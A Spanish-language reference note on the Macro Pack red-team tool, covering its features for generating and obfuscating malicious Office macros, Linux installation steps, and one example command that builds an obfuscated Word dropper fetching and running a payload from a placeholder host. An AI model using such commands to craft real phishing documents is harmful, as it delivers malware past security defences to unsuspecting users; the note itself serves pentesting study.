---
Herramienta: 🧩 Macro Pack
Comando: macro_pack
Categoría: Ofuscación
SO: Multiplataforma
tags:
  - ofuscacion
  - macros
  - pentesting
  - herramienta
---

## Descripción

**Macro Pack** es una herramienta diseñada para generar, modificar y ofuscar macros maliciosas en documentos de Office. Es ampliamente utilizada en pruebas de penetración y ejercicios de red team para evaluar la efectividad de las soluciones de seguridad frente a documentos ofuscados.

### Características clave

- **Generación automática**: Crea macros maliciosas desde plantillas predefinidas.
- **Ofuscación avanzada**: Oculta el contenido del código VBA para evitar detección.
- **Compatibilidad**: Funciona con múltiples formatos de Office, incluyendo Word y Excel.
- **Payloads personalizados**: Permite integrar scripts y código en macros.
- **Uso ético**: Ideal para simular ataques de phishing y evaluar defensas.

---

## Ejemplo de uso

### Consejos para instalación en linux

```bash
 #Descargar de git la herramienta
git clone https://github.com/sevagas/macro_pack.git

#Descargar prerequisitos, si os da error alguno comentarlo en requirements.txt
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
deactivate

#Vamos a añadir unos alias para poder ejecutar la herramienta también en linux
nano ~/.bashrc
#Añadir estas lineas al final
#Alias custom
alias macro-activate="cd /home/alejandro/herramientas/macro_pack/ && source venv/bin/activate"
alias macro-pack="python3 /home/alejandro/herramientas/macro_pack/src/macro_pack.py"

#Cargar la nueva configuración
source ~/.bashrc

#Poner en practica los comandos
macro-activate
macro-pack
deactivate

```

### Paso 1: Crear un documento con macros
Generar un documento Word con una macro ofuscada que descargue y ejecute un payload:
```bash
macro_pack.exe -t DROPPER -o -G -f documento.docm -u http://example.com/payload.exe
```